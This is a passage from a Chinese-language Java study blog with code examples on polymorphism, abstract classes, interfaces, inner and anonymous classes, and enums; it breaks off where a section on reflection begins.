class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pan3a.polymorphism;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ObjectPolymorphism</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">running</span><span class="params">(Person p)</span></span>&#123;</span><br><span class="line">        p.run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        running(<span class="keyword">new</span> Person());</span><br><span class="line">        running(<span class="keyword">new</span> Student());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Person run&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student run&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>具体例子，多态就会自动选择实例类型。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ObjectPolymorphismDemo</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"><span class="comment">//      一个有普通收入 工资收入 国家补贴的人计算税</span></span><br><span class="line">        Income[] incomes = <span class="keyword">new</span> Income[]&#123;</span><br><span class="line">                <span class="keyword">new</span> Income(<span class="number">3000</span>),</span><br><span class="line">                <span class="keyword">new</span> Salary(<span class="number">7500</span>),</span><br><span class="line">                <span class="keyword">new</span> StateCouncilSpecialAllowance(<span class="number">15000</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        System.out.println(totalTax(incomes));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">double</span> <span class="title">totalTax</span><span class="params">(Income... incomes)</span></span>&#123;</span><br><span class="line">        <span class="keyword">double</span> total = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Income income:incomes)&#123;</span><br><span class="line">            total += income.getTax();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Income</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">double</span> income;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Income</span><span class="params">(<span class="keyword">double</span> income)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.income = income;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getTax</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> income * <span class="number">0.1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 计算税收</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Salary</span> <span class="keyword">extends</span> <span class="title">Income</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Salary</span><span class="params">(<span class="keyword">double</span> income)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(income);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getTax</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (income &lt;= <span class="number">5000</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (income - <span class="number">5000</span>) * <span class="number">0.2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 国家补贴免税收</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StateCouncilSpecialAllowance</span> <span class="keyword">extends</span> <span class="title">Salary</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">StateCouncilSpecialAllowance</span><span class="params">(<span class="keyword">double</span> income)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(income);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getTax</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h2><ul><li>抽象类只能被继承，目的是让代码更规范，因为子类必须实现父类定义的方法，即覆写父类方法。</li><li>抽象方法，如果一个类中包含抽象方法，不能包含方法体。那么该类必须是抽象类。任何子类必须重写父类抽象方法，除非子类也是抽象类。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pan3a.abstractStudy;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractStudy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Person personOne = <span class="keyword">new</span> Student(<span class="string">&quot;pan3a&quot;</span>,<span class="number">18</span>);</span><br><span class="line">        personOne.run();</span><br><span class="line">        System.out.println(personOne.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name,<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">         <span class="keyword">this</span>.name = name;</span><br><span class="line">         <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  此处不能使用Override来检查，因为构造房啊不会被继承</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name,<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(name,age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student run&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello &quot;</span> + <span class="keyword">this</span>.name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        String name = <span class="keyword">super</span>.getName();</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><ul><li>接口也可继承，可一个类实现多个接口</li><li>接口可以定义<code>default</code>方法。</li><li>接口默认的方法都是<code>public abstract</code>，这两个只是被省略了。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pan3a.interfaceStudy;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ObjectInterface</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Student personOne = <span class="keyword">new</span> Student(<span class="string">&quot;Pan3a&quot;</span>);</span><br><span class="line">        personOne.say();</span><br><span class="line">        personOne.red();</span><br><span class="line">        personOne.medium();</span><br><span class="line">        personOne.printColor();</span><br><span class="line">        System.out.println(personOne.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">say</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">String <span class="title">getName</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Color</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">red</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">//    定义接口方法，可以直接被继承调用</span></span><br><span class="line">    <span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">printColor</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is interface default method&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 接口继承接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Size</span> <span class="keyword">extends</span> <span class="title">Color</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">medium</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个类实现多个接口</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Person</span>,<span class="title">Color</span>,<span class="title">Size</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">red</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is hello method!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">medium</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is medium!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h2><ul><li>一：直接创建一个类定义在另一个类的内部</li><li>这里的访问必须实例化外部类再来请求，内部类可访问父类的私有属性。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pan3a.Inner;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ObjectInner</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Person personOne = <span class="keyword">new</span> Person(<span class="string">&quot;Pan3a&quot;</span>);</span><br><span class="line">        Person.Student student = personOne.<span class="function">new <span class="title">Student</span><span class="params">()</span></span>;</span><br><span class="line">        student.info();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">info</span><span class="params">()</span></span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello &quot;</span> + Person.<span class="keyword">this</span>.name + <span class="string">&quot; I am a Student!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>二：匿名类，不需要在内部定义一个类，直接实例化。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ObjectInnerAnonymous</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        AnonymousDemo anonymousDemo = <span class="keyword">new</span> AnonymousDemo(<span class="string">&quot;Pan3a&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Inner</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">display</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;在 Inner 类内部。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnonymousDemo</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AnonymousDemo</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        inner.display();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 匿名类继承一个类</span></span><br><span class="line">    Inner inner = <span class="keyword">new</span> Inner()&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">display</span><span class="params">()</span></span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;在匿名类内部。&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>静态内部类</li></ul><h1 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h1><ul><li>枚举限制变量只能使用预先设定好的值，相当于常量。如四季的春夏秋冬。</li><li>通过<code>name()</code>获取常量定义的字符串，注意不要使用<code>toString()</code>，因为它可以被覆盖。</li><li><code>ordinal()</code>获取常量定义的顺序，类似于数组的顺序，但是并没有实质意义，因为更改枚举元素之后顺序会发生变化。</li><li><code>enum</code>的构造方法要声明为<code>private</code>，字段强烈建议声明为<code>final</code>，常用于<code>switch</code>语句中。</li><li><code>enum</code>中也可以编写构造方法，字段，方法。</li><li>常量普通设定方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Year</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String spring = <span class="string">&quot;spring&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String summer = <span class="string">&quot;summer&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String autumn = <span class="string">&quot;autumn&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String winter = <span class="string">&quot;winter&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>注意Java版本在<code>JDK8</code>版本之前使用<code>equals</code>进行输入对比判断。也可也使用<code>===</code>进行判断。如果使用<code>==</code>比较，它比较的是两个引用类型的变量是否是同一个对象。因此，引用类型比较，要始终使用<code>equals()</code>方法，但<code>enum</code>类型可以例外。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Year</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String spring = <span class="string">&quot;spring&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String summer = <span class="string">&quot;summer&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String autumn = <span class="string">&quot;autumn&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String winter = <span class="string">&quot;winter&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EnumStudy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">       String day;</span><br><span class="line">       Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">       day = scan.nextLine();</span><br><span class="line">       scan.close();</span><br><span class="line">       <span class="keyword">if</span>(day.equals(Year.spring) || day.equals(Year.autumn))&#123;</span><br><span class="line">           System.out.println(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>迭代枚举元素</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">Years</span></span>&#123;</span><br><span class="line">    SPRING,SUMMER,AUTUMN,WINTER;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EnumStudy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (Years y: Years.values())&#123;</span><br><span class="line">            System.out.println(y);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>结合<code>switch</code></li></ul><h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><ul><li><code>Java</code>的反射，Java的反射是指程序在运行期可以拿到一个对象的所有信息。</li><li>创建一个类，后面用来进行测试使用，注意请将一下测试文件都放在一个包内。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span 